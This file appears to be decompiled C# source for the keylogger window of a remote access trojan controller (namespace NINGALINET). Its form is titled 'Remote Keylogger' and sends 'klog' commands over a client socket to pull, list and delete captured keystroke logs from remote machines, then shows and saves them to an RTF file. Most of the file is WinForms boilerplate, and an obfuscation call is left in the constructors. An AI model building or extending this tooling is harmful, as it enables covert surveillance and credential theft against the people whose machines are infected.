using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x0200001B RID: 27
	[DesignerGenerated]
	public partial class FrmLogger : Form
	{
		// Token: 0x060005EB RID: 1515 RVA: 0x00003F13 File Offset: 0x00002113
		[DebuggerNonUserCode]
		static FrmLogger()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FrmLogger.__ENCList = new List<WeakReference>();
		}

		// Token: 0x060005EC RID: 1516 RVA: 0x00003F24 File Offset: 0x00002124
		[DebuggerNonUserCode]
		public FrmLogger()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.Load += new EventHandler(this.FrmLogger_Load);
			FrmLogger.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x060005ED RID: 1517 RVA: 0x00032D60 File Offset: 0x00030F60
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmLogger.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FrmLogger.__ENCList.Count == FrmLogger.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FrmLogger.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmLogger.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FrmLogger.__ENCList[num] = FrmLogger.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmLogger.__ENCList.RemoveRange(num, FrmLogger.__ENCList.Count - num);
						FrmLogger.__ENCList.Capacity = FrmLogger.__ENCList.Count;
					}
					FrmLogger.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x1700023B RID: 571
		// (get) Token: 0x060005F0 RID: 1520 RVA: 0x000338C4 File Offset: 0x00031AC4
		// (set) Token: 0x060005F1 RID: 1521 RVA: 0x00003F50 File Offset: 0x00002150
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x1700023C RID: 572
		// (get) Token: 0x060005F2 RID: 1522 RVA: 0x000338DC File Offset: 0x00031ADC
		// (set) Token: 0x060005F3 RID: 1523 RVA: 0x000338F4 File Offset: 0x00031AF4
		internal virtual ToolStripMenuItem SelectAllToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SelectAllToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SelectAllToolStripMenuItem_Click);
				if (this._SelectAllToolStripMenuItem != null)
				{
					this._SelectAllToolStripMenuItem.Click -= value2;
				}
				this._SelectAllToolStripMenuItem = value;
				if (this._SelectAllToolStripMenuItem != null)
				{
					this._SelectAllToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700023D RID: 573
		// (get) Token: 0x060005F4 RID: 1524 RVA: 0x0003394C File Offset: 0x00031B4C
		// (set) Token: 0x060005F5 RID: 1525 RVA: 0x00033964 File Offset: 0x00031B64
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem_Click);
				if (this._CopyToolStripMenuItem != null)
				{
					this._CopyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem = value;
				if (this._CopyToolStripMenuItem != null)
				{
					this._CopyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700023E RID: 574
		// (get) Token: 0x060005F6 RID: 1526 RVA: 0x000339BC File Offset: 0x00031BBC
		// (set) Token: 0x060005F7 RID: 1527 RVA: 0x000339D4 File Offset: 0x00031BD4
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				if (this._RefreshToolStripMenuItem != null)
				{
					this._RefreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				if (this._RefreshToolStripMenuItem != null)
				{
					this._RefreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700023F RID: 575
		// (get) Token: 0x060005F8 RID: 1528 RVA: 0x00033A2C File Offset: 0x00031C2C
		// (set) Token: 0x060005F9 RID: 1529 RVA: 0x00003F59 File Offset: 0x00002159
		internal virtual ToolStripSeparator AToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._AToolStripMenuItem = value;
			}
		}

		// Token: 0x17000240 RID: 576
		// (get) Token: 0x060005FA RID: 1530 RVA: 0x00033A44 File Offset: 0x00031C44
		// (set) Token: 0x060005FB RID: 1531 RVA: 0x00003F62 File Offset: 0x00002162
		internal virtual ToolStrip ToolStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStrip1 = value;
			}
		}

		// Token: 0x17000241 RID: 577
		// (get) Token: 0x060005FC RID: 1532 RVA: 0x00033A5C File Offset: 0x00031C5C
		// (set) Token: 0x060005FD RID: 1533 RVA: 0x00003F6B File Offset: 0x0000216B
		internal virtual ToolStripTextBox ToolStripTextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripTextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripTextBox1 = value;
			}
		}

		// Token: 0x17000242 RID: 578
		// (get) Token: 0x060005FE RID: 1534 RVA: 0x00033A74 File Offset: 0x00031C74
		// (set) Token: 0x060005FF RID: 1535 RVA: 0x00033A8C File Offset: 0x00031C8C
		internal virtual ToolStripButton ToolStripButton1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripButton1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripButton1_Click);
				if (this._ToolStripButton1 != null)
				{
					this._ToolStripButton1.Click -= value2;
				}
				this._ToolStripButton1 = value;
				if (this._ToolStripButton1 != null)
				{
					this._ToolStripButton1.Click += value2;
				}
			}
		}

		// Token: 0x17000243 RID: 579
		// (get) Token: 0x06000600 RID: 1536 RVA: 0x00033AE4 File Offset: 0x00031CE4
		// (set) Token: 0x06000601 RID: 1537 RVA: 0x00003F74 File Offset: 0x00002174
		internal virtual CHProgressbar pr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._pr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._pr = value;
			}
		}

		// Token: 0x17000244 RID: 580
		// (get) Token: 0x06000602 RID: 1538 RVA: 0x00033AFC File Offset: 0x00031CFC
		// (set) Token: 0x06000603 RID: 1539 RVA: 0x00033B14 File Offset: 0x00031D14
		internal virtual LV Lv1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lv1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Lv1_SelectedIndexChanged);
				EventHandler value3 = new EventHandler(this.Lv1_DoubleClick);
				if (this._Lv1 != null)
				{
					this._Lv1.SelectedIndexChanged -= value2;
					this._Lv1.DoubleClick -= value3;
				}
				this._Lv1 = value;
				if (this._Lv1 != null)
				{
					this._Lv1.SelectedIndexChanged += value2;
					this._Lv1.DoubleClick += value3;
				}
			}
		}

		// Token: 0x17000245 RID: 581
		// (get) Token: 0x06000604 RID: 1540 RVA: 0x00033B90 File Offset: 0x00031D90
		// (set) Token: 0x06000605 RID: 1541 RVA: 0x00003F7D File Offset: 0x0000217D
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x17000246 RID: 582
		// (get) Token: 0x06000606 RID: 1542 RVA: 0x00033BA8 File Offset: 0x00031DA8
		// (set) Token: 0x06000607 RID: 1543 RVA: 0x00003F86 File Offset: 0x00002186
		internal virtual ContextMenuStrip ContextMenuStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip2 = value;
			}
		}

		// Token: 0x17000247 RID: 583
		// (get) Token: 0x06000608 RID: 1544 RVA: 0x00033BC0 File Offset: 0x00031DC0
		// (set) Token: 0x06000609 RID: 1545 RVA: 0x00033BD8 File Offset: 0x00031DD8
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				if (this._ToolStripMenuItem1 != null)
				{
					this._ToolStripMenuItem1.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				if (this._ToolStripMenuItem1 != null)
				{
					this._ToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x17000248 RID: 584
		// (get) Token: 0x0600060A RID: 1546 RVA: 0x00033C30 File Offset: 0x00031E30
		// (set) Token: 0x0600060B RID: 1547 RVA: 0x00003F8F File Offset: 0x0000218F
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x17000249 RID: 585
		// (get) Token: 0x0600060C RID: 1548 RVA: 0x00033C48 File Offset: 0x00031E48
		// (set) Token: 0x0600060D RID: 1549 RVA: 0x00003F98 File Offset: 0x00002198
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x1700024A RID: 586
		// (get) Token: 0x0600060E RID: 1550 RVA: 0x00033C60 File Offset: 0x00031E60
		// (set) Token: 0x0600060F RID: 1551 RVA: 0x00003FA1 File Offset: 0x000021A1
		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		// Token: 0x1700024B RID: 587
		// (get) Token: 0x06000610 RID: 1552 RVA: 0x00033C78 File Offset: 0x00031E78
		// (set) Token: 0x06000611 RID: 1553 RVA: 0x00033C90 File Offset: 0x00031E90
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem_Click);
				if (this._DeleteToolStripMenuItem != null)
				{
					this._DeleteToolStripMenuItem.Click -= value2;
				}
				this._DeleteToolStripMenuItem = value;
				if (this._DeleteToolStripMenuItem != null)
				{
					this._DeleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700024C RID: 588
		// (get) Token: 0x06000612 RID: 1554 RVA: 0x00033CE8 File Offset: 0x00031EE8
		// (set) Token: 0x06000613 RID: 1555 RVA: 0x00003FAA File Offset: 0x000021AA
		internal virtual Label sl
		{
			[DebuggerNonUserCode]
			get
			{
				return this._sl;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._sl = value;
			}
		}

		// Token: 0x1700024D RID: 589
		// (get) Token: 0x06000614 RID: 1556 RVA: 0x00033D00 File Offset: 0x00031F00
		// (set) Token: 0x06000615 RID: 1557 RVA: 0x00003FB3 File Offset: 0x000021B3
		internal virtual ToolStripSeparator AToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._AToolStripMenuItem1 = value;
			}
		}

		// Token: 0x1700024E RID: 590
		// (get) Token: 0x06000616 RID: 1558 RVA: 0x00033D18 File Offset: 0x00031F18
		// (set) Token: 0x06000617 RID: 1559 RVA: 0x00033D30 File Offset: 0x00031F30
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				if (this._SaveAsToolStripMenuItem != null)
				{
					this._SaveAsToolStripMenuItem.Click -= value2;
				}
				this._SaveAsToolStripMenuItem = value;
				if (this._SaveAsToolStripMenuItem != null)
				{
					this._SaveAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000618 RID: 1560 RVA: 0x00003FBC File Offset: 0x000021BC
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.Copy();
		}

		// Token: 0x06000619 RID: 1561 RVA: 0x00033D88 File Offset: 0x00031F88
		public void insert(string T)
		{
			if (T.StartsWith("\u0001") & T.EndsWith("\u0001"))
			{
				this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
				this.T1.SelectionColor = Color.RoyalBlue;
				this.T1.AppendText("\r\n[ " + T.Replace("\u0001", "") + "]\r\n");
			}
			else
			{
				this.T1.SelectionFont = this.T1.Font;
				this.T1.SelectionColor = Color.Black;
				this.T1.AppendText(T + "\r\n");
			}
		}

		// Token: 0x0600061A RID: 1562 RVA: 0x00003FC9 File Offset: 0x000021C9
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.sk.Send("klog!" + ima.Y + this.TextBox1.Text);
		}

		// Token: 0x0600061B RID: 1563 RVA: 0x00003FF1 File Offset: 0x000021F1
		private void SelectAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.SelectAll();
		}

		// Token: 0x0600061C RID: 1564 RVA: 0x00033E44 File Offset: 0x00032044
		private void ToolStripButton1_Click(object sender, EventArgs e)
		{
			if (this.T1.Find(this.ToolStripTextBox1.Text, checked(this.T1.SelectionStart + this.T1.SelectionLength), RichTextBoxFinds.None) == -1)
			{
				this.T1.Find(this.ToolStripTextBox1.Text, 0, RichTextBoxFinds.None);
			}
		}

		// Token: 0x0600061D RID: 1565 RVA: 0x00033EA0 File Offset: 0x000320A0
		private void FrmLogger_Load(object sender, EventArgs e)
		{
			this.Text = Conversions.ToString(Operators.ConcatenateObject("Remote Keylogger - ", ima.vno(this.sk.L)));
			this.folder = Operators.ConcatenateObject(Operators.ConcatenateObject(this.sk.Folder, ima.vno(this.sk.L)), "\\");
			if (!Directory.Exists(Conversions.ToString(this.folder)))
			{
				Directory.CreateDirectory(Conversions.ToString(this.folder));
			}
		}

		// Token: 0x0600061E RID: 1566 RVA: 0x00033F28 File Offset: 0x00032128
		private void Lv1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.Lv1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					this.sk.Send("klog!" + ima.Y + listViewItem.Text);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600061F RID: 1567 RVA: 0x00033FAC File Offset: 0x000321AC
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.Lv1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem arg_1F_0 = (ListViewItem)enumerator.Current;
					this.sk.Send("klog");
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000620 RID: 1568 RVA: 0x00003FFE File Offset: 0x000021FE
		private void Lv1_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.TextBox1.Text = this.Lv1.FocusedItem.Text;
		}

		// Token: 0x06000621 RID: 1569 RVA: 0x00034020 File Offset: 0x00032220
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.Lv1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					this.sk.Send("klog@" + ima.Y + listViewItem.Text);
					this.sk.Send("klog");
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000622 RID: 1570 RVA: 0x000340B4 File Offset: 0x000322B4
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog
			{
				Filter = "RTF|*.rtf",
				FileName = "KeyLogger.rtf"
			};
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				try
				{
					File.WriteAllText(saveFileDialog.FileName, this.T1.Text);
					ima.F.sl.Text = Conversions.ToString(Operators.AddObject(Operators.AddObject("Save Keylogger ", ima.vno(this.sk.L)), " succeeded.."));
				}
				catch (Exception expr_7D)
				{
					ProjectData.SetProjectError(expr_7D);
					ima.F.sl.Text = Conversions.ToString(Operators.AddObject(Operators.AddObject("Save Keylogger ", ima.vno(this.sk.L)), " error.."));
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x040002B9 RID: 697
		private static List<WeakReference> __ENCList;

		// Token: 0x040002BB RID: 699
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x040002BC RID: 700
		[AccessedThroughProperty("SelectAllToolStripMenuItem")]
		private ToolStripMenuItem _SelectAllToolStripMenuItem;

		// Token: 0x040002BD RID: 701
		[AccessedThroughProperty("CopyToolStripMenuItem")]
		private ToolStripMenuItem _CopyToolStripMenuItem;

		// Token: 0x040002BE RID: 702
		[AccessedThroughProperty("RefreshToolStripMenuItem")]
		private ToolStripMenuItem _RefreshToolStripMenuItem;

		// Token: 0x040002BF RID: 703
		[AccessedThroughProperty("AToolStripMenuItem")]
		private ToolStripSeparator _AToolStripMenuItem;

		// Token: 0x040002C0 RID: 704
		[AccessedThroughProperty("ToolStrip1")]
		private ToolStrip _ToolStrip1;

		// Token: 0x040002C1 RID: 705
		[AccessedThroughProperty("ToolStripTextBox1")]
		private ToolStripTextBox _ToolStripTextBox1;

		// Token: 0x040002C2 RID: 706
		[AccessedThroughProperty("ToolStripButton1")]
		private ToolStripButton _ToolStripButton1;

		// Token: 0x040002C3 RID: 707
		[AccessedThroughProperty("pr")]
		private CHProgressbar _pr;

		// Token: 0x040002C4 RID: 708
		[AccessedThroughProperty("Lv1")]
		private LV _Lv1;

		// Token: 0x040002C5 RID: 709
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x040002C6 RID: 710
		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip _ContextMenuStrip2;

		// Token: 0x040002C7 RID: 711
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x040002C8 RID: 712
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x040002C9 RID: 713
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x040002CA RID: 714
		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		// Token: 0x040002CB RID: 715
		[AccessedThroughProperty("DeleteToolStripMenuItem")]
		private ToolStripMenuItem _DeleteToolStripMenuItem;

		// Token: 0x040002CC RID: 716
		[AccessedThroughProperty("sl")]
		private Label _sl;

		// Token: 0x040002CD RID: 717
		[AccessedThroughProperty("AToolStripMenuItem1")]
		private ToolStripSeparator _AToolStripMenuItem1;

		// Token: 0x040002CE RID: 718
		[AccessedThroughProperty("SaveAsToolStripMenuItem")]
		private ToolStripMenuItem _SaveAsToolStripMenuItem;

		// Token: 0x040002CF RID: 719
		public Client c;

		// Token: 0x040002D0 RID: 720
		private ListViewItem last;

		// Token: 0x040002D1 RID: 721
		public object folder;

		// Token: 0x040002D2 RID: 722
		public Client sk;
	}
}
